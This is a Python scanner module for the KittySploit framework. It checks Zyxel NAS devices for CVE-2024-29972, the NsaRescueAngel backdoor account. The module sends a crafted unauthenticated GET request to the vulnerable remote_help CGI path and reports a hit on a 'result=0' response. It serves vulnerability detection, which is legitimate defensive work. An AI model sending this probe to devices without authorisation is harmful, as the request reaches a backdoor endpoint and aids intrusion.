#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The command injection vulnerability in the CGI program "remote_help-cgi" in Zyxel NAS326 firmware versions bef."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zyxel NAS326 Firmware < V5.21(AAZF.17)C0 - NsaRescueAngel Backdoor Account Detection',
        'description': 'The command injection vulnerability in the CGI program "remote_help-cgi" in Zyxel NAS326 firmware versions before V5.21(AAZF.17)C0 and NAS542 firmware versions before V5.21(ABAG.14)C0 could allow an unauthenticated attacker to execute some operating system (OS) commands by sending a crafted HTTP POST request.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'zyxel', 'backdoor', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-29972',
        ],
        'cve': 'CVE-2024-29972',
    }

    def run(self):
        path = '/desktop,/cgi-bin/remote_help-cgi/favicon.ico?type=sshd_tdc'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('result=0',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='Zyxel NAS326 Firmware < V5.21(AAZF.17)C0 - NsaRescueAngel Backdoor Account detected', path=path)
            return True
        return False

